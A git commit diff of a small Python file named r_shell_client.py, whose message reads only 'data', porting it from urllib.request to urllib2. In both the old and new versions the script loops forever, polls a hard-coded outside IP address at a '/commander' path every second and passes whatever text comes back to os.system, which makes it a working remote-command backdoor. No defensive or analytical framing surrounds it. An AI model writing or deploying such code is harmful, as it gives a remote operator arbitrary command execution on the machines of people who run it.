69a4a1cd8cb6e1a618275eb838502cc0d957fb9c
Ömer Özhan <omer.ozhan@andela.com>
2022-09-12 22:54:09 +0300

    data

--- r_shell_client.py
+++ r_shell_client.py
@@ -1,11 +1,13 @@
 import os
-import urllib.request
+import urllib2
 import time
 
 while True:
-    with urllib.request.urlopen('http://139.144.67.163/commander') as response:
-        command_data = response.read().decode("utf-8")
+    url = "http://139.144.67.163/commander"
+    req = urllib2.Request(url)
+    response = urllib2.urlopen(req)
+    command_data = response.read().decode("utf-8")
 
-        if not command_data == "No Action":
-            os.system(command_data)
+    if not command_data == "No Action":
+        os.system(command_data)
     time.sleep(1)
